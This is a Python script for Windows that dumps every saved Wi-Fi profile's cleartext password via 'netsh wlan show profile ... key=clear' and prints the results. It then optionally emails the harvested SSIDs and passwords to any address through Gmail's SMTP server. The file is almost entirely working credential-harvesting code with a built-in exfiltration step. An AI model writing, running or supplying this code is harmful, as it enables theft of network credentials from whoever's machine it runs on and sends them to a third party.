
import subprocess 
import re
import time
import smtplib
from email.message import EmailMessage

#This is a program which gathers the history of used SSID's and passwords. 
#It will send the gathered information to a desired email address if chosen.

print("\n******************************************\n")
print("Just a moment, gathering the SSID's and passwords")
print("\n******************************************\n")
fstep = subprocess.run(["netsh", "wlan", "show", "profiles"], capture_output = True).stdout.decode()
#Python allows us to run windows system commands by using subprocess module
sysinp = (re.findall("All User Profile     : (.*)\r", fstep))
fnout = []   #here in this list all the SSID's and password found will be stored
if len(sysinp) != 0:
    for name in sysinp:
        wifidict = {} #This dictionary allows us to store the 'SECURITY KEY'  which is found successfully
        profile_info = subprocess.run(["netsh", "wlan", "show", "profile", name], capture_output = True).stdout.decode()
        if re.search("Security key           : Absent", profile_info):
            continue
        else:
            wifidict["ssid"] = name  #Here if the 'SECURITY KEY' of the SSID returns TRUE, 
            #then in will go-on to extract the password by adding 'key=clear' in the subprocess code line
            goodSSID = subprocess.run(["netsh", "wlan", "show", "profile", name, "key=clear"], capture_output = True).stdout.decode()
            vlpass = re.search("Key Content            : (.*)\r", goodSSID)
            if vlpass == None:
                wifidict["password"] = None
            else:
                wifidict["password"] = vlpass[1]
            fnout.append(wifidict)
for x in range(len(fnout)):
    print(fnout[x])

#prints the SSID and password which are found

print("\n******************************************\n")
eml = input("Would you like to send the SSID's and password to an email (Y/N): ").lower()

if eml == 'y':
    try:
        email_message = ""
        for item in fnout:
            email_message += f"SSID: {item['ssid']}, Password: {item['password']}\n"
        #print(email_message)
        email = EmailMessage()
        email["from"] = input("Enter the senders recipent email: ")
        email["to"] = input("Enter the recievers recipent email: ")
        email["subject"] = "WiFi SSIDs and Passwords"

        #using smtplib module we are getting the required information from the user and send it to the mentioned recipent
        

        email.set_content(email_message)

        print("\n******************************************\n")
        loginid = input("Enter the login email ID: ")
        loginpss = input("Enter the login email ID password: ")
        print("\n******************************************\n")
        pnumber = int(input("Enter the port number to send the email: "))

        print("\nAlmost sent, just need some couple of minutes\n")
        
        with smtplib.SMTP(host="smtp.gmail.com", port=pnumber) as smtp:
            smtp.ehlo()
            smtp.starttls()
            smtp.login(loginid, loginpss)
            smtp.send_message(email)
    except smtplib.SMTPException:
        print("Error occured, try again")
    
    except TimeoutError:
        print("Request timed out, try again later")
    
    except KeyboardInterrupt:
        print("Invalid Keystrokes")
    
    '''Handling most of the possible exception errors'''

elif eml == 'n':
    print("Done!")
else:
    print("Invalid operator")